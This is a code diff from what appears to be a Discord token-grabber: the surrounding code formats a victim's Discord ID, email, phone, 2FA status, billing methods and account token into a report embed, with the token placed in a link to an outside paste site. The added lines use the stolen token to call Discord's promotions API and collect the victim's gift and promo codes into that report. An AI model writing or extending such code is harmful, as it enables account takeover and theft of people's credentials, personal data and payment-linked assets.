@@ -286,6 +286,26 @@ class grabtokens():
 
             val += f'<:1119pepesneakyevil:972703371221954630> `Discord ID:` **{discord_id}** \n<:gmail:996083031632773181> `Email:` **{email}**\n<:mobilephone:996101721879224331> `Phone:` **{phone}**\n\n<:2fa:996102455744012428> `2FA:` **{mfa}**\n<a:nitroboost:996004213354139658> `Nitro:` **{nitro}**\n<:billing:996099943574012024> `Billing:` **{methods}**\n\n<:pepehappy:996100452112400526> `Token:` **{token}**\n[Click to copy!](https://paste.addi00000.repl.co/?p={token})\n'
 
+            g = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers={
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
+                'Content-Type': 'application/json',
+                'Authorization': token
+            })
+            val_codes = []
+            if "code" in g.text:
+                codes = json.loads(g.text)
+                for code in codes:
+                    val_codes.append((code['code'], code['promotion']['outbound_title']))
+
+            if val_codes == []:
+                val += f'\n:gift: **None**\n'
+            else:
+                for c, t in val_codes:                
+                    val += f'\n:gift: `{t}:`\n**{c}**\n'
+
+            embed.add_field(name="\u200b", inline=False)                                                                                                                                                                                                                                                                                                                                                                                                                                                          
+            embed.add_field(name=val_name, value=val, inline=False)
+
 def ss():
     ImageGrab.grab(
         bbox=None,
